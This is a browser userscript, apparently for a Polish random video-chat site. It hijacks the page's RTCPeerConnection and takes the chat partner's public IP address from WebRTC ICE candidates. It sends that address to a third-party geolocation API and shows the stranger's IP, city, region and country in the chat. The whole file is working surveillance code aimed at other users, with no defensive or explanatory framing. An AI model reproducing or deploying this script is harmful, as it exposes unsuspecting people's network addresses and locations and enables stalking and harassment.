const API_KEY = "YOUR_KEY"
const scriptConfig = {
  style: 0, // Available styles: 0 | 1
}

const getIpInformations = async (ip) => {
    const request = await fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=${API_KEY}&ip=${ip}`);
    const data = await request.json();
    return data;
}

const messageContent = document.createElement('div');
messageContent.id = 'ome_plus'
messageContent.className = 'message system';

const messageAvatarContainer = document.createElement('div');
messageAvatarContainer.className = 'message-avatar';

const messageAvatar = document.createElement('img');
messageAvatar.className = 'logo';
messageAvatar.src = 'https://cdn0.iconfinder.com/data/icons/unigrid-flat-human-vol-2/90/011_101_anonymous_anonym_hacker_vendetta_user_human_avatar-512.png'

messageAvatarContainer.appendChild(messageAvatar)
messageContent.appendChild(messageAvatarContainer)

const messageBubble = document.createElement('div');
messageBubble.className = 'message-bubble';

const messageSpan = document.createElement('span');

const updateInformations = async (ip) => {
  const ipData = await getIpInformations(ip);
  const messages = document.querySelector('.chat__messages');
  if(document.querySelector('#ome_plus')) document.querySelector('#ome_plus').remove()
  const localization = `${ipData.city}, ${ipData.state_prov}, ${ipData.country_name}`;
      
  scriptConfig.style == 0 ?
    messageSpan.textContent = `Witaj, moje ip to ${ip} i mieszkam w ${localization}`
    : messageSpan.innerHTML = `IP: ${ip}<br>Lokalizacja: ${localization}`
  messageBubble.append(messageSpan);
  messageContent.appendChild(messageBubble)
  messages.appendChild(messageContent); 
}

// Inject Script to RTC

window.oRTCPeerConnection =
  window.oRTCPeerConnection || window.RTCPeerConnection;

window.RTCPeerConnection = function (...args) {
  const pc = new window.oRTCPeerConnection(...args);
  pc.oaddIceCandidate = pc.addIceCandidate;
  pc.addIceCandidate = (iceCandidate, ...rest) => {
    const fields = iceCandidate.candidate.split(" ");
    const ip = fields[4];
    if (fields[7] === "srflx") {
      updateInformations(ip);
    }
    return pc.oaddIceCandidate(iceCandidate, ...rest);
  };
  return pc;
};
